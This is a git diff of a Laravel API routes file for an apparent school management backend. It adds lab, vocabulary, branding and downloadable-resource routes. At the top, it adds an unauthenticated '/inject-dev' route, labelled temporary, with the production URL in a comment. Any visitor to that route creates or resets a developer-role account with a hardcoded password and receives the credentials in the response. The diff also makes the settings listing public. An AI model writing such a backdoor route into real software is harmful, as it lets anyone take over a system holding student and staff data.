@@ -15,7 +15,48 @@ use App\Http\Controllers\Api\AIController;
 use App\Http\Controllers\Api\HardwareItemController;
 use App\Http\Controllers\Api\ScienceLabController;
 
+// TEMPORARY: Emergency Developer Injection
+// Access this via browser: https://backend.inkiitomanohseniorschool.co.ke/api/inject-dev
+Route::get('/inject-dev', function () {
+    $user = \App\Models\User::updateOrCreate(
+        ['email' => 'developer@inkiitomanoh.com'],
+        [
+            'name' => 'System Developer',
+            'password' => \Illuminate\Support\Facades\Hash::make('Developer2026!'),
+            'role' => 'developer',
+        ]
+    );
+    return response()->json([
+        'message' => 'Developer user ready!',
+        'email' => $user->email,
+        'password' => 'Developer2026!'
+    ]);
+});
+
 Route::post('/login', [AuthController::class, 'login']);
+
+// Public Branding & Settings (For Login Page)
+Route::get('/settings', [SettingController::class, 'index']);
+Route::get('/branding', function() {
+    try {
+        $primary = \App\Models\Setting::where('key', 'brand_primary')->first()?->value ?? '#d81d22';
+        $secondary = \App\Models\Setting::where('key', 'brand_secondary')->first()?->value ?? '#4b4da3';
+        $accent = \App\Models\Setting::where('key', 'brand_accent')->first()?->value ?? '#f8af18';
+        
+        return response()->json([
+            'brand_primary' => $primary,
+            'brand_secondary' => $secondary,
+            'brand_accent' => $accent,
+        ]);
+    } catch (\Exception $e) {
+        return response()->json([
+            'brand_primary' => '#d81d22',
+            'brand_secondary' => '#4b4da3',
+            'brand_accent' => '#f8af18',
+        ]);
+    }
+});
+
 
 Route::middleware('auth:sanctum')->group(function () {
     
@@ -65,8 +106,7 @@ Route::middleware('auth:sanctum')->group(function () {
     Route::get('/student/assignments', [AssignmentController::class, 'studentAssignments']);
     Route::post('/assignments/{id}/submit', [AssignmentController::class, 'submitWork']); // Submits JSON answers
 
-    // --- SETTINGS ---
-    Route::get('/settings', [SettingController::class, 'index']);
+    // --- SETTINGS (Protected update) ---
     Route::put('/settings', [SettingController::class, 'update']);
 
     // --- NOTIFICATIONS ---
@@ -81,6 +121,13 @@ Route::middleware('auth:sanctum')->group(function () {
 
     // --- AI / INTELLIGENCE ---
     Route::get('/ai/vocabulary/generate', [AIController::class, 'generateVocabulary']);
+    Route::post('/ai/vocabulary/mark-learned', [AIController::class, 'markLearned']);
+    
+    // Admin Vocabulary Management
+    Route::get('/admin/vocabularies', [AIController::class, 'index']);
+    Route::post('/admin/vocabularies', [AIController::class, 'store']);
+    Route::get('/admin/ai-test', [AIController::class, 'testGemini']);
+    Route::delete('/admin/vocabularies/{id}', [AIController::class, 'destroy']);
 
     // --- HARDWARE ITEMS (ICT LAB) ---
     Route::get('/hardware-items', [HardwareItemController::class, 'index']);
@@ -98,6 +145,12 @@ Route::middleware('auth:sanctum')->group(function () {
     Route::put('/science-labs/experiments/{id}', [ScienceLabController::class, 'updateExperiment']);
     Route::delete('/science-labs/experiments/{id}', [ScienceLabController::class, 'destroyExperiment']);
     Route::patch('/science-labs/{id}/toggle-status', [ScienceLabController::class, 'toggleLabStatus']);
+    Route::put('/science-labs/{id}/coordinator', [ScienceLabController::class, 'assignCoordinator']);
+    
+    // Lab Questions
+    Route::post('/science-labs/{id}/ask', [ScienceLabController::class, 'askQuestion']);
+    Route::get('/lab-questions', [ScienceLabController::class, 'getQuestions']);
+    Route::post('/lab-questions/{id}/answer', [ScienceLabController::class, 'answerQuestion']);
 
     // --- CAREERS & PATHWAYS ---
     Route::get('/pathways', [\App\Http\Controllers\Api\CareerController::class, 'getPathways']);
@@ -114,4 +167,10 @@ Route::middleware('auth:sanctum')->group(function () {
     // --- GRADES & REPORTS ---
     Route::get('/admin/gradebook', [\App\Http\Controllers\Api\GradeController::class, 'index']);
     Route::get('/admin/gradebook/{userId}', [\App\Http\Controllers\Api\GradeController::class, 'show']);
+
+    // --- DOWNLOADABLE RESOURCES ---
+    Route::get('/downloadables', [\App\Http\Controllers\Api\DownloadableController::class, 'index']);
+    Route::get('/admin/downloadables', [\App\Http\Controllers\Api\DownloadableController::class, 'adminIndex']);
+    Route::post('/admin/downloadables', [\App\Http\Controllers\Api\DownloadableController::class, 'store']);
+    Route::delete('/admin/downloadables/{id}', [\App\Http\Controllers\Api\DownloadableController::class, 'destroy']);
 });
